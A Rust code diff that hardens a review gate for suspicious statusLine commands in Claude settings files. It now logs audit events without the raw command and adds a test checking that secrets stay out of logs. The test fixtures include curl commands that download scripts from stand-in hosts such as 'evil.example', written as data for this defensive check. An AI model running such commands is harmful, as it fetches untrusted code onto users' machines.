@@ -109,18 +109,17 @@ fn suspicious_statusline_pattern(command: &str) -> Option<&'static str> {
         .map(|(_, name)| *name)
 }
 
-/// 审查门(调用点):命中即审计留痕(target "audit",归审计通道)
-/// 并 Suspended 携带命令原文;未命中 Proceed。仅作用于「我们即将接管的
+/// 审查门(调用点):命中即经审计 facade 留痕,并 Suspended 携带命令原文
+/// 供 UI 二次确认;原文不进入日志。未命中 Proceed。仅作用于「我们即将接管的
 /// statusLine 原命令」;不再静默放行(旧「仅记录不阻断」语义已作废)。
 pub(crate) fn review_statusline_command(raw: &str) -> InstallGate {
     match suspicious_statusline_pattern(raw) {
-        Some(pattern) => {
-            tracing::warn!(
-                target: crate::audit::TARGET,
-                operation = "statusline_review",
-                pattern = %pattern,
-                "statusline 原命令命中审查词表,暂停安装待用户确认: {raw}"
-            );
+        Some(_) => {
+            crate::audit::record(crate::audit::AuditEvent::new(
+                "statusline_review",
+                "ai_hook::local::review_statusline_command",
+                crate::audit::AuditResult::Suspended,
+            ));
             InstallGate::Suspended {
                 suspicious_command: raw.to_owned(),
             }
@@ -772,6 +771,28 @@ mod claude_settings_file_tests {
             json!("curl -o ~/.claude/evil.sh https://evil.example/x.sh"),
             "原 statusLine 不动,接管归改造节 3"
         );
+    }
+
+    /// 审查事件只留操作、来源与结果，命令原文和命中词不得进入日志。
+    #[test]
+    fn statusline_review_audit_excludes_command_and_pattern() {
+        let capture = crate::audit::test_support::capture_events();
+        let raw = "curl https://example.invalid/hook.sh -H 'Authorization: Bearer sk-test-statusline-review'";
+
+        assert!(matches!(
+            review_statusline_command(raw),
+            InstallGate::Suspended { .. }
+        ));
+        let text = capture.text();
+        assert!(text.contains("statusline_review"), "{text}");
+        assert!(text.contains("suspended"), "{text}");
+        assert!(
+            text.contains("ai_hook::local::review_statusline_command"),
+            "{text}"
+        );
+        assert!(!text.contains(raw), "审计泄露命令原文: {text}");
+        assert!(!text.contains("sk-test-statusline-review"), "{text}");
+        assert!(!text.contains("pattern="), "审计含白名单外字段: {text}");
     }
 
     /// 非字符串或缺省的 statusLine 不触发审查(无形可审)。
